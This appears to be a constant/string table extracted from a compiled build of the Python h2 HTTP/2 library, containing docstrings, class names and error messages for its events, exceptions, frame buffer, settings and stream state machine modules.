a__doc__a__file__a__spec__ahas_locationa__cached__lasettingsTaChangedSettinga_setting_code_from_intluh2.eventsa__module__u
    Base class for h2 events.
    aEventa__qualname__a__prepare__aRequestReceiveda__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>u
    The RequestReceived event is fired whenever request headers are received.
    This event carries the HTTP headers for the given request and the stream ID
    of the new stream.

    .. versionchanged:: 2.3.0
       Changed the type of ``headers`` to :class:`HeaderTuple
       <hpack:hpack.HeaderTuple>`. This has no effect on current users.

    .. versionchanged:: 2.4.0
       Added ``stream_ended`` and ``priority_updated`` properties.
    a__init__uRequestReceived.__init__a__repr__uRequestReceived.__repr__a__orig_bases__aResponseReceivedu
    The ResponseReceived event is fired whenever response headers are received.
    This event carries the HTTP headers for the given response and the stream
    ID of the new stream.

    .. versionchanged:: 2.3.0
       Changed the type of ``headers`` to :class:`HeaderTuple
       <hpack:hpack.HeaderTuple>`. This has no effect on current users.

   .. versionchanged:: 2.4.0
      Added ``stream_ended`` and ``priority_updated`` properties.
    uResponseReceived.__init__uResponseReceived.__repr__aTrailersReceivedu
    The TrailersReceived event is fired whenever trailers are received on a
    stream. Trailers are a set of headers sent after the body of the
    request/response, and are used to provide information that wasn't known
    ahead of time (e.g. content-length). This event carries the HTTP header
    fields that form the trailers and the stream ID of the stream on which they
    were received.

    .. versionchanged:: 2.3.0
       Changed the type of ``headers`` to :class:`HeaderTuple
       <hpack:hpack.HeaderTuple>`. This has no effect on current users.

    .. versionchanged:: 2.4.0
       Added ``stream_ended`` and ``priority_updated`` properties.
    uTrailersReceived.__init__uTrailersReceived.__repr__a_HeadersSentu
    The _HeadersSent event is fired whenever headers are sent.

    This is an internal event, used to determine validation steps on
    outgoing header blocks.
    a_ResponseSentu
    The _ResponseSent event is fired whenever response headers are sent
    on a stream.

    This is an internal event, used to determine validation steps on
    outgoing header blocks.
    a_RequestSentu
    The _RequestSent event is fired whenever request headers are sent
    on a stream.

    This is an internal event, used to determine validation steps on
    outgoing header blocks.
    a_TrailersSentu
    The _TrailersSent event is fired whenever trailers are sent on a
    stream. Trailers are a set of headers sent after the body of the
    request/response, and are used to provide information that wasn't known
    ahead of time (e.g. content-length).

    This is an internal event, used to determine validation steps on
    outgoing header blocks.
    a_PushedRequestSentu
    The _PushedRequestSent event is fired whenever pushed request headers are
    sent.

    This is an internal event, used to determine validation steps on outgoing
    header blocks.
    aInformationalResponseReceivedu
    The InformationalResponseReceived event is fired when an informational
    response (that is, one whose status code is a 1XX code) is received from
    the remote peer.

    The remote peer may send any number of these, from zero upwards. These
    responses are most commonly sent in response to requests that have the
    ``expect: 100-continue`` header field present. Most users can safely
    ignore this event unless you are intending to use the
    ``expect: 100-continue`` flow, or are for any reason expecting a different
    1XX status code.

    .. versionadded:: 2.2.0

    .. versionchanged:: 2.3.0
       Changed the type of ``headers`` to :class:`HeaderTuple
       <hpack:hpack.HeaderTuple>`. This has no effect on current users.

    .. versionchanged:: 2.4.0
       Added ``priority_updated`` property.
    uInformationalResponseReceived.__init__uInformationalResponseReceived.__repr__aDataReceivedu
    The DataReceived event is fired whenever data is received on a stream from
    the remote peer. The event carries the data itself, and the stream ID on
    which the data was received.

    .. versionchanged:: 2.4.0
       Added ``stream_ended`` property.
    uDataReceived.__init__uDataReceived.__repr__aWindowUpdatedu
    The WindowUpdated event is fired whenever a flow control window changes
    size. HTTP/2 defines flow control windows for connections and streams: this
    event fires for both connections and streams. The event carries the ID of
    the stream to which it applies (set to zero if the window update applies to
    the connection), and the delta in the window size.
    uWindowUpdated.__init__uWindowUpdated.__repr__aRemoteSettingsChangedu
    The RemoteSettingsChanged event is fired whenever the remote peer changes
    its settings. It contains a complete inventory of changed settings,
    including their previous values.

    In HTTP/2, settings changes need to be acknowledged. h2 automatically
    acknowledges settings changes for efficiency. However, it is possible that
    the caller may not be happy with the changed setting.

    When this event is received, the caller should confirm that the new
    settings are acceptable. If they are not acceptable, the user should close
    the connection with the error code :data:`PROTOCOL_ERROR
    <h2.errors.ErrorCodes.PROTOCOL_ERROR>`.

    .. versionchanged:: 2.0.0
       Prior to this version the user needed to acknowledge settings changes.
       This is no longer the case: h2 now automatically acknowledges
       them.
    uRemoteSettingsChanged.__init__aclassmethodafrom_settingsuRemoteSettingsChanged.from_settingsuRemoteSettingsChanged.__repr__aPingReceivedu
    The PingReceived event is fired whenever a PING is received. It contains
    the 'opaque data' of the PING frame. A ping acknowledgment with the same
    'opaque data' is automatically emitted after receiving a ping.

    .. versionadded:: 3.1.0
    uPingReceived.__init__uPingReceived.__repr__aPingAckReceivedu
    The PingAckReceived event is fired whenever a PING acknowledgment is
    received. It contains the 'opaque data' of the PING+ACK frame, allowing the
    user to correlate PINGs and calculate RTT.

    .. versionadded:: 3.1.0

    .. versionchanged:: 4.0.0
       Removed deprecated but equivalent ``PingAcknowledged``.
    uPingAckReceived.__init__uPingAckReceived.__repr__aStreamEndedu
    The StreamEnded event is fired whenever a stream is ended by a remote
    party. The stream may not be fully closed if it has not been closed
    locally, but no further data or headers should be expected on that stream.
    uStreamEnded.__init__uStreamEnded.__repr__aStreamResetu
    The StreamReset event is fired in two situations. The first is when the
    remote party forcefully resets the stream. The second is when the remote
    party has made a protocol error which only affects a single stream. In this
    case, h2 will terminate the stream early and return this event.

    .. versionchanged:: 2.0.0
       This event is now fired when h2 automatically resets a stream.
    uStreamReset.__init__uStreamReset.__repr__aPushedStreamReceivedu
    The PushedStreamReceived event is fired whenever a pushed stream has been
    received from a remote peer. The event carries on it the new stream ID, the
    ID of the parent stream, and the request headers pushed by the remote peer.
    uPushedStreamReceived.__init__uPushedStreamReceived.__repr__aSettingsAcknowledgedu
    The SettingsAcknowledged event is fired whenever a settings ACK is received
    from the remote peer. The event carries on it the settings that were
    acknowedged, in the same format as
    :class:`h2.events.RemoteSettingsChanged`.
    uSettingsAcknowledged.__init__uSettingsAcknowledged.__repr__aPriorityUpdatedu
    The PriorityUpdated event is fired whenever a stream sends updated priority
    information. This can occur when the stream is opened, or at any time
    during the stream lifetime.

    This event is purely advisory, and does not need to be acted on.

    .. versionadded:: 2.0.0
    uPriorityUpdated.__init__uPriorityUpdated.__repr__aConnectionTerminatedu
    The ConnectionTerminated event is fired when a connection is torn down by
    the remote peer using a GOAWAY frame. Once received, no further action may
    be taken on the connection: a new connection must be established.
    uConnectionTerminated.__init__uConnectionTerminated.__repr__aAlternativeServiceAvailableu
    The AlternativeServiceAvailable event is fired when the remote peer
    advertises an `RFC 7838 <https://tools.ietf.org/html/rfc7838>`_ Alternative
    Service using an ALTSVC frame.

    This event always carries the origin to which the ALTSVC information
    applies. That origin is either supplied by the server directly, or inferred
    by h2 from the ``:authority`` pseudo-header field that was sent by
    the user when initiating a given stream.

    This event also carries what RFC 7838 calls the "Alternative Service Field
    Value", which is formatted like a HTTP header field and contains the
    relevant alternative service information. h2 does not parse or in any
    way modify that information: the user is required to do that.

    This event can only be fired on the client end of a connection.

    .. versionadded:: 2.3.0
    uAlternativeServiceAvailable.__init__uAlternativeServiceAvailable.__repr__aUnknownFrameReceivedu
    The UnknownFrameReceived event is fired when the remote peer sends a frame
    that h2 does not understand. This occurs primarily when the remote
    peer is employing HTTP/2 extensions that h2 doesn't know anything
    about.

    RFC 7540 requires that HTTP/2 implementations ignore these frames. h2
    does so. However, this event is fired to allow implementations to perform
    special processing on those frames if needed (e.g. if the implementation
    is capable of handling the frame itself).

    .. versionadded:: 2.7.0
    uUnknownFrameReceived.__init__u<UnknownFrameReceived>uUnknownFrameReceived.__repr__uh2\events.pyTa.0acsu<module h2.events>Ta__class__TaselfTadataTaclsaold_settingsanew_settingsweasettinganew_valueaoriginal_valueachangeu.h2.exceptionsSastream_idamax_stream_iduStreamIDTooLowError: %d is lower than %dah2aerrorsaErrorCodesaSTREAM_CLOSEDaerror_codea_eventsaInvalidSettingsValueErrora__init__aexpected_lengthaactual_lengthuInvalidBodyLengthError: Expected %d bytes, received %du
h2/exceptions
~~~~~~~~~~~~~

Exceptions for the HTTP/2 module.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__uh2.errorslTEExceptiona__prepare__aH2Errora__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uh2.exceptionsa__module__u
    The base class for all exceptions for the HTTP/2 module.
    a__qualname__a__orig_bases__aProtocolErroru
    An action was attempted in violation of the HTTP/2 protocol.
    aPROTOCOL_ERRORaFrameTooLargeErroru
    The frame that we tried to send or that we received was too large.
    aFRAME_SIZE_ERRORaFrameDataMissingErroru
    The frame that we received is missing some data.

    .. versionadded:: 2.0.0
    aTooManyStreamsErroru
    An attempt was made to open a stream that would lead to too many concurrent
    streams.
    aFlowControlErroru
    An attempted action violates flow control constraints.
    aFLOW_CONTROL_ERRORaStreamIDTooLowErroru
    An attempt was made to open a stream that had an ID that is lower than the
    highest ID we have seen on this connection.
    uStreamIDTooLowError.__init__a__str__uStreamIDTooLowError.__str__aNoAvailableStreamIDErroru
    There are no available stream IDs left to the connection. All stream IDs
    have been exhausted.

    .. versionadded:: 2.0.0
    aNoSuchStreamErroru
    A stream-specific action referenced a stream that does not exist.

    .. versionchanged:: 2.0.0
       Became a subclass of :class:`ProtocolError
       <h2.exceptions.ProtocolError>`
    uNoSuchStreamError.__init__aStreamClosedErroru
    A more specific form of
    :class:`NoSuchStreamError <h2.exceptions.NoSuchStreamError>`. Indicates
    that the stream has since been closed, and that all state relating to that
    stream has been removed.
    uStreamClosedError.__init__u
    An attempt was made to set an invalid Settings value.

    .. versionadded:: 2.0.0
    uInvalidSettingsValueError.__init__aInvalidBodyLengthErroru
    The remote peer sent more or less data that the Content-Length header
    indicated.

    .. versionadded:: 2.0.0
    uInvalidBodyLengthError.__init__uInvalidBodyLengthError.__str__aUnsupportedFrameErroru
    The remote peer sent a frame that is unsupported in this context.

    .. versionadded:: 2.1.0

    .. versionchanged:: 4.0.0
       Removed deprecated KeyError parent class.
    aRFC1122Erroru
    Emitted when users attempt to do something that is literally allowed by the
    relevant RFC, but is sufficiently ill-defined that it's unwise to allow
    users to actually do it.

    While there is some disagreement about whether or not we should be liberal
    in what accept, it is a truth universally acknowledged that we should be
    conservative in what emit.

    .. versionadded:: 2.4.0
    aDenialOfServiceErroru
    Emitted when the remote peer exhibits a behaviour that is likely to be an
    attempt to perform a Denial of Service attack on the implementation. This
    is a form of ProtocolError that carries a different error code, and allows
    more easy detection of this kind of behaviour.

    .. versionadded:: 2.5.0
    aENHANCE_YOUR_CALMuh2\exceptions.pyu<module h2.exceptions>Ta__class__TaselfaexpectedaactualTaselfamsgaerror_codea__class__Taselfastream_idTaselfastream_idamax_stream_idTaselfu.h2.frame_bufferRVcadatalamax_frame_sizecPRI * HTTP/2.0

SM

a_preamblea_preamble_lena_headers_bufferaminaProtocolErrorTuInvalid HTTP/2 preamble.u
        Add more data to the frame buffer.

        :param data: A bytestring containing the byte buffer.
        aFrameTooLargeErroruReceived overlong frame: length %d, max %du
        Confirm that the frame is an appropriate length.
        astream_idaContinuationFrameTuInvalid frame during header block.aappendaCONTINUATION_BACKLOGTuToo many continuation frames received.aEND_HEADERSaflagsaaddTaEND_HEADERSaHeadersFrameaPushPromiseFramewfu
        Updates the internal header buffer. Returns a frame that should replace
        the current one. May throw exceptions if this frame is invalid.
        u<genexpr>uFrameBuffer._update_header_buffer.<locals>.<genexpr>aFrameaparse_frame_header:nlnutoo many values to unpack (expected 2)aInvalidDataErroraInvalidFrameErroruReceived frame with invalid header: %sla_validate_frame_lengthaparse_bodyTuReceived frame with non-compliant dataaFrameDataMissingErrorTuFrame data missing or invalida_update_header_buffera__next__u
h2/frame_buffer
~~~~~~~~~~~~~~~

A data structure that provides a way to iterate over a byte buffer in terms of
frames.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__uhyperframe.exceptionsTaInvalidFrameErroraInvalidDataErroruhyperframe.frameTaFrameaHeadersFrameaContinuationFrameaPushPromiseFrameaexceptionsTaProtocolErroraFrameTooLargeErroraFrameDataMissingErrorll@uh2.frame_buffera__module__u
    This is a data structure that expects to act as a buffer for HTTP/2 data
    that allows iteraton in terms of H2 frames.
    aFrameBuffera__qualname__TFa__init__uFrameBuffer.__init__aadd_datauFrameBuffer.add_datauFrameBuffer._validate_frame_lengthuFrameBuffer._update_header_buffera__iter__uFrameBuffer.__iter__uFrameBuffer.__next__uh2\frame_buffer.pyTa.0wxu<module h2.frame_buffer>TaselfaserverTaselfTaselfwfalengthweTaselfwfastream_idavalid_frameTaselfalengthTaselfadataadata_lenaof_which_preambleu.h2.settingsaSettingCodesu
    Given an integer setting code, returns either one of :class:`SettingCodes
    <h2.settings.SettingCodes>` or, if not present in the known set of codes,
    returns the integer directly.
    asettingaoriginal_valueanew_valueuChangedSetting(setting=%s, original_value=%s, new_value=%s)aHEADER_TABLE_SIZEacollectionsadequel aENABLE_PUSHaINITIAL_WINDOW_SIZElaMAX_FRAME_SIZElaENABLE_CONNECT_PROTOCOLla_settingsaitemsutoo many values to unpack (expected 2)a_validate_settingaInvalidSettingsValueErroruSetting %d has invalid value %dTaerror_codeaselfapopleftaChangedSettingachanged_settingsu
        The settings have been acknowledged, either by the user (remote
        settings) or by the remote peer (local settings).

        :returns: A dict of {setting: ChangedSetting} that were applied.
        u
        The current value of the :data:`HEADER_TABLE_SIZE
        <h2.settings.SettingCodes.HEADER_TABLE_SIZE>` setting.
        u
        The current value of the :data:`ENABLE_PUSH
        <h2.settings.SettingCodes.ENABLE_PUSH>` setting.
        u
        The current value of the :data:`INITIAL_WINDOW_SIZE
        <h2.settings.SettingCodes.INITIAL_WINDOW_SIZE>` setting.
        u
        The current value of the :data:`MAX_FRAME_SIZE
        <h2.settings.SettingCodes.MAX_FRAME_SIZE>` setting.
        agetaMAX_CONCURRENT_STREAMSgu
        The current value of the :data:`MAX_CONCURRENT_STREAMS
        <h2.settings.SettingCodes.MAX_CONCURRENT_STREAMS>` setting.
        aMAX_HEADER_LIST_SIZEu
        The current value of the :data:`MAX_HEADER_LIST_SIZE
        <h2.settings.SettingCodes.MAX_HEADER_LIST_SIZE>` setting. If not set,
        returns ``None``, which means unlimited.

        .. versionadded:: 2.5.0
        u
        The current value of the :data:`ENABLE_CONNECT_PROTOCOL
        <h2.settings.SettingCodes.ENABLE_CONNECT_PROTOCOL>` setting.
        aappenda__iter__aSettingsTllaErrorCodesaPROTOCOL_ERRORgaFLOW_CONTROL_ERRORlu
    Confirms that a specific setting has a well-formed value. If the setting is
    invalid, returns an error code. Otherwise, returns 0 (NO_ERROR).
    u
h2/settings
~~~~~~~~~~~

This module contains a HTTP/2 settings object. This object provides a simple
API for manipulating HTTP/2 settings, keeping track of both the current active
state of the settings and the unacknowledged future values of the settings.
a__doc__a__file__a__spec__aoriginahas_locationa__cached__ucollections.abcTaMutableMappingaMutableMappingaenumuhyperframe.frameTaSettingsFrameaSettingsFrameuh2.errorsTaErrorCodesuh2.exceptionsTaInvalidSettingsValueErroraIntEnuma__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uh2.settingsa__module__u
    All known HTTP/2 setting codes.

    .. versionadded:: 2.6.0
    a__qualname__a__orig_bases__a_setting_code_from_inta__init__uChangedSetting.__init__a__repr__uChangedSetting.__repr__u
    An object that encapsulates HTTP/2 settings state.

    HTTP/2 Settings are a complex beast. Each party, remote and local, has its
    own settings and a view of the other party's settings. When a settings
    frame is emitted by a peer it cannot assume that the new settings values
    are in place until the remote peer acknowledges the setting. In principle,
    multiple settings changes can be "in flight" at the same time, all with
    different values.

    This object encapsulates this mess. It provides a dict-like interface to
    settings, which return the *current* values of the settings in question.
    Additionally, it keeps track of the stack of proposed values: each time an
    acknowledgement is sent/received, it updates the current values with the
    stack of proposed values. On top of all that, it validates the values to
    make sure they're allowed, and raises :class:`InvalidSettingsValueError
    <h2.exceptions.InvalidSettingsValueError>` if they are not.

    Finally, this object understands what the default values of the HTTP/2
    settings are, and sets those defaults appropriately.

    .. versionchanged:: 2.2.0
       Added the ``initial_values`` parameter.

    .. versionchanged:: 2.5.0
       Added the ``max_header_list_size`` property.

    :param client: (optional) Whether these settings should be defaulted for a
        client implementation or a server implementation. Defaults to ``True``.
    :type client: ``bool``
    :param initial_values: (optional) Any initial values the user would like
        set, rather than RFC 7540's defaults.
    :type initial_vales: ``MutableMapping``
    TtnuSettings.__init__aacknowledgeuSettings.acknowledgeapropertyaheader_table_sizeuSettings.header_table_sizeasetteraenable_pushuSettings.enable_pushainitial_window_sizeuSettings.initial_window_sizeamax_frame_sizeuSettings.max_frame_sizeamax_concurrent_streamsuSettings.max_concurrent_streamsamax_header_list_sizeuSettings.max_header_list_sizeaenable_connect_protocoluSettings.enable_connect_protocoluSettings.__getitem__a__setitem__uSettings.__setitem__a__delitem__uSettings.__delitem__uSettings.__iter__a__len__uSettings.__len__a__eq__uSettings.__eq__a__ne__uSettings.__ne__uh2\settings.pyu<module h2.settings>Ta__class__TaselfakeyTaselfaotherTaselfakeyavalTaselfasettingaoriginal_valueanew_valueTaselfaclientainitial_valuesakeyavalueainvalidTaselfTaselfakeyavalueainvalidaitemsTacodeTasettingavalueTaselfachanged_settingswkwvaold_settinganew_settingTaselfavalueu.h2.streamNaStreamStateaIDLEastateastream_idaclientaheaders_sentatrailers_sentaheaders_receivedatrailers_receivedastream_closed_byaStreamInputsuInput must be an instance of StreamInputsa_transitionsutoo many values to unpack (expected 2)aCLOSEDaProtocolErroruInvalid input %s in state %su
        Process a specific input in the state machine.
        a_RequestSentu
        Fires when a request is sent.
        TuClient cannot send responses.a_ResponseSenta_TrailersSentu
        Fires when something that should be a response is sent. This 'response'
        may actually be trailers.
        aRequestReceivedu
        Fires when a request is received.
        aResponseReceivedaTrailersReceivedu
        Fires when a response is received. Also disambiguates between responses
        and trailers.
        Tucannot receive data before headersaDataReceivedu
        Fires when data is received.
        aWindowUpdatedu
        Fires when a window update frame is received.
        aStreamEndedu
        Fires when an END_STREAM flag is received in the OPEN state,
        transitioning this stream to a HALF_CLOSED_REMOTE state.
        aStreamClosedByaRECV_END_STREAMu
        Fires when a stream is cleanly ended.
        aRECV_RST_STREAMaStreamResetu
        Fired when a stream is forcefully reset.
        u
        Fires on the newly pushed stream, when pushed by the local peer.

        No event here, but definitionally this peer must be a server.
        u
        Fires on the newly pushed stream, when pushed by the remote peer.

        No event here, but definitionally this peer must be a client.
        TuCannot push streams from client peers.a_PushedRequestSentu
        Fires on the already-existing stream when a PUSH_PROMISE frame is sent.
        We may only send PUSH_PROMISE frames if we're a server.
        uIdle streams cannot receive pushesuCannot receive pushed streams as a serveraPushedStreamReceivedaparent_stream_idu
        Fires on the already-existing stream when a PUSH_PROMISE frame is
        received. We may only receive PUSH_PROMISE frames if we're a client.

        Fires a PushedStreamReceived event.
        aSEND_END_STREAMu
        Called when an attempt is made to send END_STREAM in the
        HALF_CLOSED_REMOTE state.
        aSEND_RST_STREAMu
        Called when an attempt is made to send RST_STREAM in a non-closed
        stream state.
        aStreamClosedErroraErrorCodesaSTREAM_CLOSEDaerror_codearemote_reseta_eventsu
        Called when we need to forcefully emit another RST_STREAM frame on
        behalf of the state machine.

        If this is the first time we've done this, we should also hang an event
        off the StreamClosedError so that the user can be informed. We know
        it's the first time we've done this if the stream is currently in a
        state other than CLOSED.
        u
        Called when an unexpected frame is received on an already-closed
        stream.

        An endpoint that receives an unexpected frame should treat it as
        a stream error or connection error with type STREAM_CLOSED, depending
        on the specific frame. The error handling is done at a higher level:
        this just raises the appropriate error.
        u
        Called when an attempt is made to send data on an already-closed
        stream.

        This essentially overrides the standard logic by throwing a
        more-specific error: StreamClosedError. This is a ProtocolError, so it
        matches the standard API of the state machine, but provides more detail
        to the user.
        TuAttempted to push on closed stream.u
        Called when a PUSH_PROMISE frame is received on a full stop
        stream.

        If the stream was closed by us sending a RST_STREAM frame, then we
        presume that the PUSH_PROMISE was in flight when we reset the parent
        stream. Rathen than accept the new stream, we just reset it.
        Otherwise, we should call this a PROTOCOL_ERROR: pushing a stream on a
        naturally closed stream is a real problem because it creates a brand
        new stream that the remote peer now believes exists.
        u
        Called when an attempt is made to push on an already-closed stream.

        This essentially overrides the standard logic by providing a more
        useful error message. It's necessary because simply indicating that the
        stream is closed is not enough: there is now a new stream that is not
        allowed to be there. The only recourse is to tear the whole connection
        down.
        TuInformation response after final responseu
        Called when an informational header block is sent (that is, a block
        where the :status header has a 1XX value).

        Only enforces that these are sent *before* final headers are sent.
        TuInformational response after final responseaInformationalResponseReceivedu
        Called when an informational header block is received (that is, a block
        where the :status header has a 1XX value).
        aAlternativeServiceAvailableu
        Called when receiving an ALTSVC frame.

        RFC 7838 allows us to receive ALTSVC frames at any stream state, which
        is really absurdly overzealous. For that reason, we want to limit the
        states in which we can actually receive it. It's really only sensible
        to receive it after we've sent our own headers and before the server
        has sent its header block: the server can't guarantee that we have any
        state around after it completes its header block, and the server
        doesn't know what origin we're talking about before we've sent ours.

        For that reason, this function applies a few extra checks on both state
        and some of the little state variables we keep around. If those suggest
        an unreasonable situation for the ALTSVC frame to have been sent in,
        we quietly ignore it (as RFC 7838 suggests).

        This function is also *not* always called by the state machine. In some
        states (IDLE, RESERVED_LOCAL, CLOSED) we don't bother to call it,
        because we know the frame cannot be valid in that state (IDLE because
        the server cannot know what origin the stream applies to, CLOSED
        because the server cannot assume we still have state around,
        RESERVED_LOCAL because by definition if we're in the RESERVED_LOCAL
        state then *we* are the server).
        TuCannot send ALTSVC after sending response headers.u
        Called when sending an ALTSVC frame on this stream.

        For consistency with the restrictions we apply on receiving ALTSVC
        frames in ``recv_alt_svc``, we want to restrict when users can send
        ALTSVC frames to the situations when we ourselves would accept them.

        That means: when we are a server, when we have received the request
        headers, and when we have not yet sent our own response headers.
        aH2StreamStateMachineastate_machineamax_outbound_frame_sizearequest_methodaoutbound_flow_control_windowaWindowManagera_inbound_window_managera_expected_content_lengthla_actual_content_lengtha_authorityaconfigu<%s id:%d state:%r>a__name__acurrent_window_sizeu
        The size of the inbound flow control window for the stream. This is
        rarely publicly useful: instead, use :meth:`remote_flow_control_window
        <h2.stream.H2Stream.remote_flow_control_window>`. This shortcut is
        largely present to provide a shortcut to this data.
        aSTREAM_OPENu
        Whether the stream is 'open' in any sense: that is, whether it counts
        against the number of concurrent streams.
        u
        Whether the stream is closed.
        u
        Returns how the stream was closed, as one of StreamClosedBy.
        aloggeradebuguUpgrading %rlaUPGRADE_CLIENTaUPGRADE_SERVERaprocess_inputu
        Called by the connection to indicate that this stream is the initial
        request/response of an upgraded connection. Places the stream into an
        appropriate state.
        uSend headers %s on %raSEND_HEADERSais_informational_responseTuCannot set END_STREAM on informational responses.aSEND_INFORMATIONAL_HEADERSaHeadersFramea_build_hdr_validation_flagsa_build_headers_framesaflagsaaddTaEND_STREAMTuTrailers must have END_STREAM set.aauthority_from_headersaextract_method_headeru
        Returns a list of HEADERS/CONTINUATION frames to emit as either headers
        or trailers.
        uPush stream %raSEND_PUSH_PROMISEaPushPromiseFrameapromised_stream_idu
        Returns a list of PUSH_PROMISE/CONTINUATION frames to emit as a pushed
        stream header. Called on the stream that has the PUSH_PROMISE frame
        sent on it.
        u
        Mark this stream as one that was pushed by this peer. Must be called
        immediately after initialization. Sends no frames, simply updates the
        state machine.
        uSend data on %r with end stream set to %saSEND_DATAaDataFrameadataTaPADDEDapad_lengthaflow_controlled_lengthu
        Prepare some data frames. Optionally end the stream.

        .. warning:: Does not perform flow control checks.
        uEnd stream %ru
        End a stream without sending data.
        uAdvertise alternative service of %r for %raSEND_ALTERNATIVE_SERVICEaAltSvcFrameafieldu
        Advertise an RFC 7838 alternative service. The semantics of this are
        better documented in the ``H2Connection`` class.
        uIncrease flow control window for %r by %daSEND_WINDOW_UPDATEawindow_openedaWindowUpdateFrameawindow_incrementu
        Increase the size of the flow control window for the remote side.
        uReceive Push Promise on %r for remote stream %daRECV_PUSH_PROMISEapushed_stream_ida_process_received_headersaheadersu
        Receives a push promise frame sent on this stream, pushing a remote
        stream. This is called on the stream that has the PUSH_PROMISE sent
        on it.
        u%r pushed by remote peeru
        Mark this stream as one that was pushed by the remote peer. Must be
        called immediately after initialization. Sends no frames, simply
        updates the state machine.
        TuCannot set END_STREAM on informational responsesaRECV_INFORMATIONAL_HEADERSaRECV_HEADERSastream_endeda_initialize_content_lengthTuTrailers must have END_STREAM setu
        Receive a set of headers (or trailers).
        uReceive data on %r with end stream %s and flow control length set to %daRECV_DATAawindow_consumeda_track_content_lengthaextendu
        Receive some data.
        uReceive Window Update on %r for increment of %daRECV_WINDOW_UPDATEadeltaaguard_increment_windowaFlowControlErroraFLOW_CONTROL_ERRORareset_streamu
        Handle a WINDOW_UPDATE increment.
        uReceive Continuation frame on %raRECV_CONTINUATIONTuShould not be reachableu
        A naked CONTINUATION frame has been received. This is always an error,
        but the type of error it is depends on the state of the stream and must
        transition the state of the stream, so we need to handle it.
        uReceive Alternative Service frame on stream %raoriginTLpaRECV_ALTERNATIVE_SERVICEafield_valueu
        An Alternative Service frame was received on the stream. This frame
        inherits the origin associated with this stream.
        uLocal reset %r with error code: %daRstStreamFrameu
        Close the stream locally. Reset the stream with an error code.
        uRemote reset %r with error code: %da_error_code_from_intu
        Handle a stream being reset remotely.
        uAcknowledge received data with size %d on %raprocess_bytesu
        The user has informed us that they've processed some amount of data
        that was received on this stream. Pass that to the window manager and
        potentially return some WindowUpdate frames.
        aHeaderValidationFlagsTais_clientais_trailerais_response_headerais_push_promiseu
        Constructs a set of header validation flags for use when normalizing
        and validating header blocks.
        anormalize_outbound_headersavalidate_outbound_headersaencodeaself:lnnaContinuationFrameaframesqTaEND_HEADERSu
        Helper method to build headers or push promise frames.
        anormalize_inbound_headersavalidate_inbound_headersavalidate_headersa_decode_headersu
        When headers have been received from the remote peer, run a processing
        pipeline on them to transform them into the appropriate form for
        attaching to an event.
        cHEADccontent-lengthl
uInvalid content-length header: %su
        Checks the headers for a content-length header and initializes the
        _expected_content_length field from it. It's not an error for no
        Content-Length header to be present.
        aInvalidBodyLengthErroru
        Update the expected content length in response to data being received.
        Validates that the appropriate amount of data is sent. Always updates
        the received data, but only validates the length against the
        content-length header if one was sent.

        :param length: The length of the body chunk received.
        :param end_stream: If this is the last body chunk received.
        amax_window_sizeu
        We changed SETTINGS_INITIAL_WINDOW_SIZE, which means we need to
        update the target window size for flow control. For our flow control
        strategy, this means we need to do two things: we need to adjust the
        current window size, but we also need to set the target maximum window
        size to the new value.
        u
    Given an iterable of header two-tuples and an encoding, decodes those
    headers using that encoding while preserving the type of the header tuple.
    This ensures that the use of ``HeaderTuple`` is preserved.
    aHeaderTupleadecodeaencodingu
h2/stream
~~~~~~~~~

An implementation of a HTTP/2 stream.
a__doc__a__file__a__spec__ahas_locationa__cached__aenumTaEnumaIntEnumaEnumaIntEnumahpackTaHeaderTupleuhyperframe.frameTaHeadersFrameaContinuationFrameaDataFrameaWindowUpdateFrameaRstStreamFrameaPushPromiseFrameaAltSvcFrameaerrorsTaErrorCodesa_error_code_from_intaeventsTaRequestReceivedaResponseReceivedaDataReceivedaWindowUpdatedaStreamEndedaPushedStreamReceivedaStreamResetaTrailersReceivedaInformationalResponseReceivedaAlternativeServiceAvailablea_ResponseSenta_RequestSenta_TrailersSenta_PushedRequestSentaexceptionsTaProtocolErroraStreamClosedErroraInvalidBodyLengthErroraFlowControlErrorautilitiesTaguard_increment_windowais_informational_responseaauthority_from_headersavalidate_headersavalidate_outbound_headersanormalize_outbound_headersaHeaderValidationFlagsaextract_method_headeranormalize_inbound_headersawindowsTaWindowManagera__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %su<metaclass>uh2.streama__module__a__qualname__aRESERVED_REMOTElaRESERVED_LOCALlaOPENlaHALF_CLOSED_REMOTElaHALF_CLOSED_LOCALla__orig_bases__llllll
lllllu
    A single HTTP/2 stream state machine.

    This stream object implements basically the state machine described in
    RFC 7540 section 5.1.

    :param stream_id: The stream ID of this stream. This is stored primarily
        for logging purposes.
    a__init__uH2StreamStateMachine.__init__uH2StreamStateMachine.process_inputarequest_sentuH2StreamStateMachine.request_sentaresponse_sentuH2StreamStateMachine.response_sentarequest_receiveduH2StreamStateMachine.request_receivedaresponse_receiveduH2StreamStateMachine.response_receivedadata_receiveduH2StreamStateMachine.data_receivedawindow_updateduH2StreamStateMachine.window_updatedastream_half_closeduH2StreamStateMachine.stream_half_closeduH2StreamStateMachine.stream_endedastream_resetuH2StreamStateMachine.stream_resetasend_new_pushed_streamuH2StreamStateMachine.send_new_pushed_streamarecv_new_pushed_streamuH2StreamStateMachine.recv_new_pushed_streamasend_push_promiseuH2StreamStateMachine.send_push_promisearecv_push_promiseuH2StreamStateMachine.recv_push_promiseasend_end_streamuH2StreamStateMachine.send_end_streamasend_reset_streamuH2StreamStateMachine.send_reset_streamareset_stream_on_erroruH2StreamStateMachine.reset_stream_on_errorarecv_on_closed_streamuH2StreamStateMachine.recv_on_closed_streamasend_on_closed_streamuH2StreamStateMachine.send_on_closed_streamarecv_push_on_closed_streamuH2StreamStateMachine.recv_push_on_closed_streamasend_push_on_closed_streamuH2StreamStateMachine.send_push_on_closed_streamasend_informational_responseuH2StreamStateMachine.send_informational_responsearecv_informational_responseuH2StreamStateMachine.recv_informational_responsearecv_alt_svcuH2StreamStateMachine.recv_alt_svcasend_alt_svcuH2StreamStateMachine.send_alt_svcu
    A low-level HTTP/2 stream object. This handles building and receiving
    frames and maintains per-stream state.

    This wraps a HTTP/2 Stream state machine implementation, ensuring that
    frames can only be sent/received when the stream is in a valid state.
    Attempts to create frames that cannot be sent will raise a
    ``ProtocolError``.
